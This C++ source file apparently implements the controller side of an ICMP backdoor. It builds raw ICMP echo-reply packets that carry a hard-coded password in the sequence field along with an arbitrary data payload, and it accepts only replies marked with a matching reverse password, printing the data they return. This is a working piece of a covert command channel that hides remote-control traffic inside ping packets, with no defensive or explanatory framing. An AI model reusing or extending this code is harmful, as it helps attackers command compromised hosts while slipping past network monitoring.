#include "icmp.h"


ICMP_CONTROL::ICMP_CONTROL()
{
	OutputString=true;
	fromlen=sizeof(from);
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		fprintf(stderr, "WSAStartup failed: %d\n", GetLastError());
		ExitProcess(STATUS_FAILED);
	}
}

ICMP_CONTROL::~ICMP_CONTROL()
{
	closesocket(sockRaw);
	WSACleanup();
}

void ICMP_CONTROL::SetTimeOut(int type,int timeout)
{
	setsockopt(sockRaw, SOL_SOCKET, type==0?SO_SNDTIMEO:SO_RCVTIMEO, (char *) &timeout, sizeof(timeout));
	if(type==0)sendtimeout=timeout;
	else recvtimeout=timeout;
}

int ICMP_CONTROL::GetTimeOut(int type)
{
	return (type==0?sendtimeout:recvtimeout);
}

void ICMP_CONTROL::socket(const char*ip)
{
	sockRaw=::socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	memset(&dest,0,sizeof(dest));
	dest.sin_addr.s_addr=inet_addr(ip);
	dest.sin_family=AF_INET;
	memset(this->ipaddress,0,sizeof(this->ipaddress));strcpy(this->ipaddress,ip);
}

bool ICMP_CONTROL::send(const char*buffer,long buflen)
{
	//datasize=strlen(buffer);
	//Pay attention to this !
	if(buflen==0)
		buflen=strlen(buffer)+1;
	datasize=buflen;
	datasize+=sizeof(IcmpHeader);
	datasize+=sizeof(int);
	if(OutputString)printf("ICMP packet size is %d",datasize);
	icmp_data= (char*)xmalloc(MAX_PACKET);
	recvbuf= (char *)xmalloc(MAX_PACKET);
	memset(icmp_data,0, MAX_PACKET);
	//fill_icmp_data(icmp_data, datasize,recvtimeout);

	IcmpHeader *icmp_hdr;
	char *datapart;
	icmp_hdr= (IcmpHeader *)icmp_data;
	icmp_hdr->i_type=0;
	icmp_hdr->i_code=0;
	icmp_hdr->i_id=(USHORT)GetCurrentProcessId();
	icmp_hdr->timestamp =GetTickCount();
	icmp_hdr->i_seq=ICMP_PASSWORD;
	
	datapart=icmp_data + sizeof(IcmpHeader);
	memcpy(datapart,&recvtimeout,sizeof(int));
	datapart+=sizeof(int);
	memcpy(datapart,buffer,/*strlen(buffer)+1*/buflen);

	((IcmpHeader *)icmp_data)->i_cksum=0;
	((IcmpHeader *)icmp_data)->i_cksum=checksum((USHORT *)icmp_data, datasize);
	int bwrote=sendto(sockRaw, icmp_data, datasize, 0, (struct sockaddr *) &dest, sizeof(dest));
	xfree(icmp_data);
	if (bwrote == SOCKET_ERROR)
	{
		if(OutputString)
		{
			if (WSAGetLastError() == WSAETIMEDOUT) printf("Timed out\n");
			fprintf(stderr,"sendto failed: %d\n",WSAGetLastError());
		}
		return false;
	}
	if (bwrote<datasize ) {
		if(OutputString)printf("send only %d datas but total %d datas.\n",bwrote,datasize);
		return false;
	}
	if(OutputString)printf("\nSend Packet to %s Success!\n",ipaddress);
	return true;
}

bool ICMP_CONTROL::recv(void)
{
	if(!recv1())
		if(!recv1())
			if(!recv1())
			{
				printf("Failed more then 3 times !!!\n");
				return false;
			}
	return true;
}

bool ICMP_CONTROL::recv1(void)
{
	//DWORD start = GetTickCount();
	//for(;;){
	//if((GetTickCount() - start) >= 1000) break;
	memset(recvbuf,0,MAX_PACKET);
	int bread=recvfrom(sockRaw, recvbuf, MAX_PACKET, 0, (struct sockaddr *) &from, &fromlen);
	if(bread == SOCKET_ERROR)
	{
		if(WSAGetLastError() == WSAETIMEDOUT)
		{
			if(OutputString)printf("recv timed out\n");
			return false;
			//break;
		}
		if(OutputString)fprintf(stderr, "recvfrom failed: %d\n", WSAGetLastError());
		//break;
		return false;
	}
	//decode_resp(recvbuf, bread, &from);


	memset(arg,0,sizeof(arg));
	IpHeader *iphdr;
	IcmpHeader *icmphdr;
	unsigned short iphdrlen;
	iphdr = (IpHeader *)recvbuf;
	iphdrlen = iphdr->h_len * 4 ; 
	icmphdr = (IcmpHeader*)(recvbuf + iphdrlen);
	if(icmphdr->i_seq==ICMP_REVERSE_PASSWORD)//??????????
	{
		memcpy(arg,recvbuf+iphdrlen+12,sizeof(arg)-1);
		argSizeRecv=bread-iphdrlen-12;
		if(OutputString)
		{
			printf("%d bytes from %s:",bread, inet_ntoa(from.sin_addr));
			printf(" IcmpType %d",icmphdr->i_type);
			printf(" IcmpCode %d",icmphdr->i_code);
			printf("\n");
			printf("------------------\n%s\n",arg);
		}
	}
	else 
	{
		if(OutputString)printf("Other ICMP Packets! (seq->%d)\n",icmphdr->i_seq);
		return false;
	}

	//}
	return true;
}


